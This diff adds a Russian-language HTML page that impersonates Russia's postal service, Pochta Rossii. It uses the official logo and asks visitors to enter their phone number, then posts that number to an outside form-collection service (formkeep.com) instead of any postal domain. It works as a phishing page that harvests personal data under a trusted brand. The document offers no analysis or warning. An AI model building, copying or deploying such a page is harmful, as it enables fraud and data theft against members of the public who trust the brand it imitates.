@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Ввод номера телефона</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap');
+
+    body, html {
+      margin: 0; padding: 0;
+      height: 100%;
+      background-color: #F6F7F9;
+      font-family: 'Inter', sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .container {
+      text-align: center;
+      width: 320px;
+      max-width: 90vw;
+      position: relative;
+    }
+
+    .logo {
+      width: 150px;
+      margin: 0 auto 30px auto;
+    }
+
+    form {
+      display: flex;
+      flex-direction: column;
+      gap: 0;
+      align-items: center;
+    }
+
+    input {
+      padding: 12px 15px;
+      font-size: 18px;
+      border: 1.8px solid #ccc;
+      border-radius: 6px;
+      width: 100%;
+      max-width: 320px;
+      font-weight: 400;
+      letter-spacing: 2px;
+      outline-offset: 2px;
+      outline-color: transparent;
+      transition: outline-color 0.3s, border-color 0.3s;
+      text-align: center;
+    }
+
+    input::placeholder {
+      color: #999999;
+    }
+
+    input:focus {
+      outline-color: #1928DC;
+      border-color: #1928DC;
+    }
+
+    button {
+      margin-top: 15px;
+      background-color: #1928DC;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 18px;
+      font-weight: 600;
+      padding: 12px 25px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+      width: 100%;
+      max-width: 320px;
+    }
+
+    button:hover {
+      background-color: #0f1ab0;
+    }
+
+    .error-message {
+      color: #DC1928;
+      font-size: 14px;
+      margin-top: 8px;
+      height: 18px;
+      font-weight: 500;
+    }
+
+    @media (max-width: 400px) {
+      .container {
+        width: 90vw;
+      }
+      input, button {
+        max-width: 100%;
+        font-size: 16px;
+        padding: 10px 12px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img 
+      src="https://www.pochta.ru/assets/Logo_Kirillicza_Dvuhstrochnyj_256d5530b1.jpg" 
+      alt="Логотип Почты России" 
+      class="logo" 
+    />
+
+    <form 
+      id="phoneForm" 
+      action="https://formkeep.com/f/7aa197d9332c" 
+      method="POST"
+      accept-charset="UTF-8"
+      enctype="multipart/form-data"
+      novalidate
+    >
+      <input 
+        type="tel"
+        name="opium" 
+        id="phoneInput"
+        placeholder="+7-000-000-00-00"
+        autocomplete="off"
+        required
+        inputmode="tel"
+      />
+      <button type="submit">Продолжить</button>
+    </form>
+
+    <div class="error-message" id="errorMessage"></div>
+  </div>
+
+  <script>
+    const phoneInput = document.getElementById('phoneInput');
+    const form = document.getElementById('phoneForm');
+    const errorMessage = document.getElementById('errorMessage');
+
+    phoneInput.addEventListener('input', () => {
+      if (!phoneInput.value.startsWith('+7')) {
+        phoneInput.value = '+7' + phoneInput.value.replace(/^\+?7?/, '');
+      }
+    });
+
+    form.addEventListener('submit', e => {
+      const raw = phoneInput.value.replace(/\D/g, '');
+      if (raw.length !== 11 || !raw.startsWith('7')) {
+        e.preventDefault();
+        errorMessage.textContent = 'Введите корректный номер телефона с кодом +7 и 10 цифрами.';
+        phoneInput.focus();
+      } else {
+        errorMessage.textContent = '';
+      }
+    });
+  </script>
+</body>
+</html>
